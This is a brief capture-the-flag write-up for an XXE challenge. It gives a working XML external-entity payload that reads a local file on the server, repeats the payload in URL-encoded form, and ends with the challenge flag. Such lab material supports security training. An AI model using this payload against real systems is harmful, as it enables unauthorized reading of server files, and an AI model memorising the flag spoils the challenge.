**Challenge:** http://challenges.ctfd.io:30471/

Target file: `/tmp/messages_outbound.txt`

Vulnerability: XXE

XML payload:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///tmp/messages_outbound.txt"> ]>
<letter><from>&ent;</from><return_addr>&ent;</return_addr><name>&ent;</name><addr>&ent;</addr><message>&ent;</message></letter>
```

Payload with URL encode:
```
%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%49%53%4f%2d%38%38%35%39%2d%31%22%3f%3e%0d%0a%3c%21%44%4f%43%54%59%50%45%20%72%65%70%6c%61%63%65%20%5b%3c%21%45%4e%54%49%54%59%20%65%6e%74%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%74%6d%70%2f%6d%65%73%73%61%67%65%73%5f%6f%75%74%62%6f%75%6e%64%2e%74%78%74%22%3e%20%5d%3e%0d%0a%3c%6c%65%74%74%65%72%3e%3c%66%72%6f%6d%3e%26%65%6e%74%3b%3c%2f%66%72%6f%6d%3e%3c%72%65%74%75%72%6e%5f%61%64%64%72%3e%26%65%6e%74%3b%3c%2f%72%65%74%75%72%6e%5f%61%64%64%72%3e%3c%6e%61%6d%65%3e%26%65%6e%74%3b%3c%2f%6e%61%6d%65%3e%3c%61%64%64%72%3e%26%65%6e%74%3b%3c%2f%61%64%64%72%3e%3c%6d%65%73%73%61%67%65%3e%26%65%6e%74%3b%3c%2f%6d%65%73%73%61%67%65%3e%3c%2f%6c%65%74%74%65%72%3e
```

**Flag:** flag{xxe_aww_yeah}
